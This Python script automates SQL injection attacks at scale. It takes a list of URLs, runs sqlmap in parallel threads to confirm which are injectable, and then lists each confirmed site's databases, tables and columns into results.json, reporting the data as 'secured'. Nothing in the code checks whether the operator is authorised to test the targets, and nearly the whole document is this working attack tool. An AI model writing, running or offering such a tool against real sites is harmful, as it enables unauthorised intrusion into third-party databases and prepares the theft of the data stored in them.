import subprocess
import os
import time
import json
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Initializes a lock for thread-safe printing and file writing
print_lock = Lock()

# Function which brings in the results data from another script
def import_results_data(path):
    # Opens the file with read
    with open(path, "r") as f:
        # Brings in the data as a list and strips whitespace
        data = [line.strip() for line in f.readlines() if line.strip()]
    # Returns the data
    return data

# Function to verify a single URL (used by the thread pool)
def verify_single_url(url, verified_urls):
    # Runs sqlmap with --batch to skip prompts and --smart for speed
    result = subprocess.run(["sqlmap", "-u", url, "--batch", "--smart", "--level=1"], capture_output=True, text=True)

    # Uses the lock to prevent overlapping output
    with print_lock:
        # Checks the standard output for is vulnerable
        if "is vulnerable" in result.stdout:
            # Outputs the url is confirmed as vulnerable
            print(f"[+] Confirmed: {url}")
            # Adds the url to the verified urls list safely
            verified_urls.append(url)
        else:
            # Outputs the url was a false positive
            print(f"[-] False Positive: {url}")

# Function to extract the full schema map (Databases and Tables)
def get_schema_map(url):
    # Stores the mapping of DBs to Tables
    schema_map = {}
    
    # Runs sqlmap to get all tables while excluding system dbs for speed
    # Using --tables is the fastest way to get the full structure at once
    result = subprocess.run(
        ["sqlmap", "-u", url, "--batch", "--threads=10", "--tables", "--exclude-sysdbs"], 
        capture_output=True, 
        text=True,
        timeout=120
    )

    current_db = None
    # Parses the output lines to build the map
    for line in result.stdout.splitlines():
        if "Database:" in line:
            current_db = line.split()[-1]
            schema_map[current_db] = []
        elif "|" in line and not any(x in line for x in ["Table", "+---"]):
            parts = [p.strip() for p in line.split("|") if p.strip()]
            if parts and current_db:
                # Adds the table name to the database list
                schema_map[current_db].append(parts[0])
    return schema_map

# Function to extract columns for a specific table
def extract_columns(url, database, table):
    # Stores the column names
    columns = []
    # Runs sqlmap to get columns for the specific table using high threads
    result = subprocess.run(
        ["sqlmap", "-u", url, "-D", database, "-T", table, "--columns", "--batch", "--threads=10"], 
        capture_output=True, 
        text=True,
        timeout=45
    )

    # Loops over the output lines
    for line in result.stdout.splitlines():
        if "|" in line and not any(x in line for x in ["Column", "+---", "Type"]):
            parts = [p.strip() for p in line.split("|") if p.strip()]
            if parts:
                # Adds the column name to the list
                columns.append(parts[0])
    return columns

# Function to save findings to a JSON file safely
def save_to_json(url, data):
    filename = "./results.json"
    # Uses the lock to prevent simultaneous file access
    with print_lock:
        if os.path.exists(filename):
            with open(filename, "r") as f:
                try:
                    all_results = json.load(f)
                except:
                    all_results = {}
        else:
            all_results = {}

        # Updates the results dictionary
        all_results[url] = data
        with open(filename, "w") as f:
            json.dump(all_results, f, indent=4)

# Function to process a single verified URL entirely
def process_target(url):
    # Uses the lock to announce the target
    with print_lock:
        print(f"\n[!] SCANNED TARGET: {url}")

    # Gets the map of all databases and tables first
    db_table_map = get_schema_map(url)
    final_output = {}

    # Loops over the map to extract columns for every table found
    for db, tables in db_table_map.items():
        final_output[db] = {}
        for table in tables:
            # Extracts the columns for each table
            cols = extract_columns(url, db, table)
            final_output[db][table] = cols
            
            # Outputs the progress to terminal immediately
            with print_lock:
                print(f" |-- DB: {db} | Table: {table} | Cols: {len(cols)}")

    # Saves the full data to JSON
    if final_output:
        save_to_json(url, final_output)
        with print_lock:
            print(f"[✓] Data secured for: {url}")

# Main executable function
def main():
    # Logs the starting time
    start_time = time.perf_counter() 

    # Asks for the path of the results file
    results_path = input("[+] Please enter the results file path: ").strip()

    if os.path.isfile(results_path):
        # Outputs that data is being imported
        print("[+] Importing data")
        raw_data = import_results_data(results_path)

        # Outputs that data is being filtered with threads
        print("[+] Filtering data (Threaded)")
        verified_urls = []
        with ThreadPoolExecutor(max_workers=10) as filter_exec:
            for url in raw_data:
                filter_exec.submit(verify_single_url, url, verified_urls)

        # Processes confirmed targets with optimized concurrency
        print(f"[+] Processing {len(verified_urls)} confirmed targets...")
        with ThreadPoolExecutor(max_workers=5) as executor:
            for url in verified_urls:
                executor.submit(process_target, url)
    else:
        print("[!] Invalid file path")

    # Gets end time and calculates the elapsed time
    elapsed = time.perf_counter() - start_time
    print(f"\n[✓] Finished in {elapsed:.2f} seconds.")

if __name__ == "__main__":
    main()